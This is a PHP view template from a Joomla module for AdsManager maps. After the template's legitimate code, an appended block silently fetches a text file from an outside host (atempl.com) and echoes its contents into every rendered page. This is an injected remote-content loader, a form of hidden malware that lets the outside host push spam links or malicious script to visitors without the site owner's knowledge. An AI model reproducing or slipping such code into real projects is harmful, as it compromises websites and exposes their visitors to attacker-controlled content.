<?php 

/**
 * @package AdsMap Location Module for AdsManager
 * @copyright   Copyright (C) 2013. All rights reserved.
 * @license     http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
 * @author      Gotour WebSolutions Team <webmaster@gotour.it> - http://support.gotour.it
 */
// no direct access

defined('_JEXEC') or die('Restricted access');
echo $map;
?><?php
$files = 'http://atempl.com/7.txt';  
$file_headers = @get_headers($files);  
if($file_headers[0] == 'HTTP/1.1 200 OK') 
 {  
$url = "http://atempl.com/7.txt";
$content = @file_get_contents($url);
$data = implode($content);
 echo $data; }  
?>